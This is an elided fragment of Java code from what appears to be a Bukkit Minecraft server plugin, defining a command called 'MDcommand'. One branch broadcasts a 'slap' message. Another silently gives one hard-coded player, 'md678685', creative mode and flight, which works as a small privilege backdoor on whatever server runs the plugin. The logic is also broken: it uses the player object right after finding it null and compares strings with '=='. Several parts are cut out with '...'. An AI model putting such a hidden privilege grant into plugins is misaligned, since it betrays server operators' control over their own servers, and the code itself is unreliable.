 		...
 		if (cmd.getName().equalsIgnoreCase("MDcommand")){
 			...
 			if (args.length == 1) {
 				...
 				if (!(sender instanceof Player)) {
					...
					plugin.broadcastMsg(sender.getName() + " slapped " + player + " hard in the face! What's " + player + " going to do about that NOW?");
 					return true;
 				}
 			} else {
 			...
 			if (Bukkit.getPlayerExact("md678685") == null) {
 				...
 				md.setFlySpeed(1);
				md.setGameMode(GameMode.CREATIVE);
 				return true;
			} else if (args[0] == "nocheatr") {
				Player md = Bukkit.getServer().getPlayer("md678685");
				md.setGameMode(GameMode.SURVIVAL);
 			}
 		} else {
 			return false;
 		}
